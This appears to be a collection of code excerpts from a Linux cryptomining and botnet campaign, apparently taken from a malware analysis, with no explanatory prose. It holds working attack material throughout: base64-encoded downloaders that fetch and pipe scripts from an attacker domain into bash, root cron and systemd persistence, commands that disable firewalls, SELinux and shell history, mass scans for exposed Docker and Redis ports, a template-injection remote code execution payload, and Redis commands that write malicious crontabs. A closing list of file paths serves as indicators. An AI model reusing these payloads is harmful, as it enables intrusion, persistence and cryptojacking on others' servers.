echo dnVybCgpIHsKCUlGUz0vIHJlYWQgLXIgcHJvdG8geCBob3N0IHF1ZXJ5IDw8PCIkMSIKICAgIGV4ZWMgMzw+Ii9kZXYvdGNwLyR7aG9zdH0vJHtQT1JUOi04MH0iCiAgICBlY2hvIC1lbiAiR0VUIC8ke3F1ZXJ5fSBIVFRQLzEuMFxyXG5Ib3N0OiAke2hvc3R9XHJcblxyXG4iID4mMwogICAgKHdoaWxlIHJlYWQgLXIgbDsgZG8gZWNobyA+JjIgIiRsIjsgW1sgJGwgPT0gJCdccicgXV0gJiYgYnJlYWs7IGRvbmUgJiYgY2F0ICkgPCYzCiAgICBleGVjIDM+Ji0KfQp2dXJsICRACg== |base64 -d

 \u003e/usr/bin/vurl \u0026\u0026 chmod +x /usr/bin/vurl;echo '* * * * * root echo dnVybCBodHRwOi8vYi45LTktOC5jb20vYnJ5c2ovY3JvbmIuc2gK|base64 -d|bash|bash' \u003e/etc/crontab \u0026\u0026 echo '* * * * * root echo dnVybCBodHRwOi8vYi45LTktOC5jb20vYnJ5c2ovY3JvbmIuc2gK|base64 -d|bash|bash' \u003e/etc/cron.d/zzh \u0026\u0026 echo KiAqICogKiAqIHJvb3QgcHl0aG9uIC1jICJpbXBvcnQgdXJsbGliMjsgcHJpbnQgdXJsbGliMi51cmxvcGVuKCdodHRwOi8vYi45XC05XC1cOC5jb20vdC5zaCcpLnJlYWQoKSIgPi4xO2NobW9kICt4IC4xOy4vLjEK|base64 -d \u003e\u003e/etc/crontab"
 ---
echo dnVybCBodHRwOi8vYi45LTktOC5jb20vYnJ5c2ovY3JvbmIuc2gK|base64 -d

vurl http[:]//b[.]9-9-8[.]com/brysj/cronb.sh
---
KiAqICogKiAqIHJvb3QgcHl0aG9uIC1jICJpbXBvcnQgdXJsbGliMjsgcHJpbnQgdXJsbGliMi51cmxvcGVuKCdodHRwOi8vYi45XC05XC1cOC5jb20vdC5zaCcpLnJlYWQoKSIgPi4xO2NobW9kICt4IC4xOy4vLjEK|base64 -d

* * * * * root python -c "import urllib2; print urllib2.urlopen('http://b.9\-9\-\8.com/t.sh').read()" >.1;chmod +x .1;./.1
---
if [ -x /bin/chattr ];then
    mv /bin/chattr /bin/zzhcht
elif [ -x /usr/bin/chattr ];then
    mv /usr/bin/chattr /usr/bin/zzhcht
elif [ -x /usr/bin/zzhcht ];then
    export CHATTR=/usr/bin/zzhcht
elif [ -x /bin/zzhcht ];then
    export CHATTR=/bin/zzhcht
else 
   if [ $(command -v yum) ];then 
	yum -y reinstall e2fsprogs
	if [ -x /bin/chattr ];then
           mv /bin/chattr /bin/zzhcht
   elif [ -x /usr/bin/chattr ];then
           mv /usr/bin/chattr /usr/bin/zzhcht
	fi
   else
	apt-get -y reinstall e2fsprogs
	if [ -x /bin/chattr ];then
          mv /bin/chattr /bin/zzhcht
  elif [ -x /usr/bin/chattr ];then
          mv /usr/bin/chattr /usr/bin/zzhcht
	fi
   fi
fi
---
env_set(){
iptables -F
systemctl stop firewalld 2>/dev/null 1>/dev/null
systemctl disable firewalld 2>/dev/null 1>/dev/null
service iptables stop 2>/dev/null 1>/dev/null
ulimit -n 65535 2>/dev/null 1>/dev/null
export LC_ALL=C 
HISTCONTROL="ignorespace${HISTCONTROL:+:$HISTCONTROL}" 2>/dev/null 1>/dev/null
export HISTFILE=/dev/null 2>/dev/null 1>/dev/null
unset HISTFILE 2>/dev/null 1>/dev/null
shopt -ou history 2>/dev/null 1>/dev/null
set +o history 2>/dev/null 1>/dev/null
HISTSIZE=0 2>/dev/null 1>/dev/null
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
setenforce 0 2>/dev/null 1>/dev/null
echo SELINUX=disabled >/etc/selinux/config 2>/dev/null
sudo sysctl kernel.nmi_watchdog=0
sysctl kernel.nmi_watchdog=0
echo '0' >/proc/sys/kernel/nmi_watchdog
echo 'kernel.nmi_watchdog=0' >>/etc/sysctl.conf
grep -q 8.8.8.8 /etc/resolv.conf || ${CHATTR} -i /etc/resolv.conf 2>/dev/null 1>/dev/null; echo "nameserver 8.8.8.8" >> /etc/resolv.conf;
grep -q 114.114.114.114 /etc/resolv.conf || ${CHATTR} -i /etc/resolv.conf 2>/dev/null 1>/dev/null; echo "nameserver 8.8.4.4" >> /etc/resolv.conf;
}
---

	${CHATTR} -ia /etc/systemd/system/sshm.service && rm -f /etc/systemd/system/sshm.service
cat >/tmp/ext4.service << EOLB
[Unit]
Description=crypto system service
After=network.target
[Service]
Type=forking
GuessMainPID=no
ExecStart=/var/tmp/.11/sshd
WorkingDirectory=/var/tmp/.11
Restart=always
Nice=0 
RestartSec=3
[Install]
WantedBy=multi-user.target
EOLB
fi
grep -q '/var/tmp/.11/bioset' /etc/systemd/system/sshb.service
if [ $? -eq 0 ]
then 
	echo service exist
else
	${CHATTR} -ia /etc/systemd/system/sshb.service && rm -f /etc/systemd/system/sshb.service
cat >/tmp/ext3.service << EOLB
[Unit]
Description=rshell system service
After=network.target
[Service]
Type=forking
GuessMainPID=no
ExecStart=/var/tmp/.11/bioset
WorkingDirectory=/var/tmp/.11
Restart=always
Nice=0 
RestartSec=3
[Install]
WantedBy=multi-user.target
EOLB
fi
...
---
127.0.0.1 registry-1.docker.io
---
...
if [ ! -f /var/.httpd/...../httpd ];then
    vurl $domain/d/h.sh > httpd
    chmod a+x httpd
    echo "FUCK chmod2"
    ls -al /var/.httpd/.....
fi
cat >/tmp/h.service <<EOL
[Service]
LimitNOFILE=65535
ExecStart=/var/.httpd/...../httpd
WorkingDirectory=/var/.httpd/.....
Restart=always 
RestartSec=30
[Install]
WantedBy=default.target
EOL
...
---
masscan <octet>.0.0.0/8 -p 2375 –rate 10000 -oL scan_<octet>.0.0.0_8.txt
---
zgrab --senders 5000 --port=2375 --http='/v1.16/version' --output-file=zgrab_output_<octet>.0.0.0_8.json`  < ips_for_zgrab_<octet>.txt 2>/dev/null
---
/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','echo dnVybCgpIHsKCUlGUz0vIHJlYWQgLXIgcHJvdG8geCBob3N0IHF1ZXJ5IDw8PCIkMSIKICAgIGV4ZWMgMzw+Ii9kZXYvdGNwLyR7aG9zdH0vJHtQT1JUOi04MH0iCiAgICBlY2hvIC1lbiAiR0VUIC8ke3F1ZXJ5fSBIVFRQLzEuMFxyXG5Ib3N0OiAke2hvc3R9XHJcblxyXG4iID4mMwogICAgKHdoaWxlIHJlYWQgLXIgbDsgZG8gZWNobyA+JjIgIiRsIjsgW1sgJGwgPT0gJCdccicgXV0gJiYgYnJlYWs7IGRvbmUgJiYgY2F0ICkgPCYzCiAgICBleGVjIDM+Ji0KfQp2dXJsIGh0dHA6Ly9iLjktOS04LmNvbS9icnlzai93LnNofGJhc2gK|base64 -d|bash').start()")}/
---
save
config set stop-writes-on-bgsave-error no
flushall
set backup1 "\n\n\n\n*/2 * * * * echo Y2QxIGh0dHA6Ly9iLjktOS04LmNvbS9icnlzai9iLnNoCg==|base64 -d|bash|bash \n\n\n"
set backup2 "\n\n\n\n*/3 * * * * echo d2dldCAtcSAtTy0gaHR0cDovL2IuOS05LTguY29tL2JyeXNqL2Iuc2gK|base64 -d|bash|bash \n\n\n"
set backup3 "\n\n\n\n*/4 * * * * echo Y3VybCBodHRwOi8vL2IuOS05LTguY29tL2JyeXNqL2Iuc2gK|base64 -d|bash|bash \n\n\n"
set backup4 "\n\n\n\n@hourly  python -c \"import urllib2; print urllib2.urlopen(\'http://b.9\-9\-8\.com/t.sh\').read()\" >.1;chmod +x .1;./.1 \n\n\n"
config set dir "/var/spool/cron/"
config set dbfilename "root"
save
config set dir "/var/spool/cron/crontabs"
save
flushall
set backup1 "\n\n\n\n*/2 * * * * root echo Y2QxIGh0dHA6Ly9iLjktOS04LmNvbS9icnlzai9iLnNoCg==|base64 -d|bash|bash \n\n\n"
set backup2 "\n\n\n\n*/3 * * * * root echo d2dldCAtcSAtTy0gaHR0cDovL2IuOS05LTguY29tL2JyeXNqL2Iuc2gK|base64 -d|bash|bash \n\n\n"
set backup3 "\n\n\n\n*/4 * * * * root echo Y3VybCBodHRwOi8vL2IuOS05LTguY29tL2JyeXNqL2Iuc2gK|base64 -d|bash|bash \n\n\n"
set backup4 "\n\n\n\n@hourly  python -c \"import urllib2; print urllib2.urlopen(\'http://b.9\-9\-8\.com/t.sh\').read()\" >.1;chmod +x .1;./.1 \n\n\n"
config set dir "/etc/cron.d"
config set dbfilename "zzh"
save
config set dir "/etc/"
config set dbfilename "crontab"
save
---
/usr/local/bin/pnscan -t512 -R 6f 73 3a 4c 69 6e 75 78 -W 2a 31 0d 0a 24 34 0d 0a 69 6e 66 6f 0d 0a 221.0.0.0/16 6379
---
/usr/bin/vurl
/etc/cron.d/zzh
/bin/zzhcht
/usr/bin/zzhcht
/var/tmp/.11/sshd
/var/tmp/.11/bioset
/var/tmp/.11/..lph
/var/tmp/.dog
/etc/systemd/system/sshm.service
/etc/systemd/system/sshb.service
/etc/systemd/system/zzhr.service
/etc/systemd/system/zzhd.service
/etc/systemd/system/zzhw.service
/etc/systemd/system/zzhh.service
/etc/…/.ice-unix/
/etc/…/.ice-unix/.watch
/etc/.httpd/…/httpd
/etc/.httpd/…/httpd
/var/.httpd/…./httpd
/var/.httpd/…../httpd

